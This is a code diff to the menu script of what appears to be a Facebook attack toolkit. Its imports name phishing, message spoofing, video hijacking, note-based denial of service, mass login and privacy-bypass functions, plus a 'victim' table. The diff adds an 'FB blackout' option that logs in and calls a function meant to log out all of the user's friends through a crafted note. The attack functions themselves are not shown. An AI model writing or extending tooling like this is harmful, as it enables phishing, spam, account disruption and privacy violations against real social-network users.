@@ -1,4 +1,4 @@
-from mainFunc import privateMessageLink,sendRequestToList,setGlobalLogginng ,reAnalyzeGraph,analyzeGraph,bypassFriendshipPrivacyPlot,massLogin,acceptRequest,friendshipRequest,like,appMessageSpoof,setMail,login,linkPreviewYoutube,linkPreview,hijackVideo, privateMessagePhishing, bypassFriendshipPrivacy, linkFriends, createUser, deleteUser,deleteAccounts, checkPrivacy, friendshipPlot, simpleGraph, dotFile, simpleDotGraph, noteDDoS, likeDev, devTest, getTest, changePassword,massMessage, massLoginTest, plotDOT, dotFileDatabase, simpleDotGraphDatabase
+from mainFunc import privateMessageLink,sendRequestToList,setGlobalLogginng ,reAnalyzeGraph,analyzeGraph,bypassFriendshipPrivacyPlot,massLogin,acceptRequest,friendshipRequest,like,appMessageSpoof,setMail,login,linkPreviewYoutube,linkPreview,hijackVideo, privateMessagePhishing, bypassFriendshipPrivacy, linkFriends, createUser, deleteUser,deleteAccounts, checkPrivacy, friendshipPlot, simpleGraph, dotFile, simpleDotGraph, noteDDoS, likeDev, devTest, getTest, changePassword,massMessage, massLoginTest, plotDOT, dotFileDatabase, simpleDotGraphDatabase, friendlyLogout
 from database import connect,status, checkTableExistence, createVictimTable
 from time import time
 import signal
@@ -60,7 +60,7 @@ def main():
                (int(option) != 21) and (int(option) != 22) and 
                (int(option) != 23) and (int(option) != 24) and
                (int(option) != 25) and (int(option) != 26) and
-               (int(option) != 27)):
+               (int(option) != 27) and (int(option) != 28)):
                         
             print '\n'
             print '1)  Create accounts\n'
@@ -89,7 +89,8 @@ def main():
             print '24) Old Like Flood (Not working)\n'
             print '25) NEW! SPAM any fanpage inbox\n'
             print '26) Bypass - database support (Beta) \n '
-            print '27) Close the application\n'
+            print '27) Logout all your friends - FB blackout \n'
+            print '28) Close the application\n'
 
             
             choice = raw_input('Insert your choice: ')
@@ -504,6 +505,21 @@ def main():
                             plotDOT(victim)
 
         if (int(option) == 27):
+            signal.signal(signal.SIGINT, signal_handler)
+            if (globalLogin == False):
+                email,password = setMail()
+            else:
+                email = globalEmail
+                password = globalPassword
+
+            if (login(email,password,'real'))!= -1:
+                raw_input('Usage: First you must create an empty note. Once your note is created, write down the note ID number from the URL. ENTER TO CONTINUE...')
+                noteID = raw_input('Insert the note ID: ')
+                option = raw_input("Insert option for privacy 0:Public 1:Friends 2:Only Me : ")
+                if option in privacySet:
+                    friendlyLogout(noteID, privacy[option])
+
+        if (int(option) == 28):
             connect.close()          
             
             print '\n \n \n \n \n \n\n \n \n \n \n \n\n \n \n \n \n \n\n \n \n \n \n \n\n \n \n \n '                        
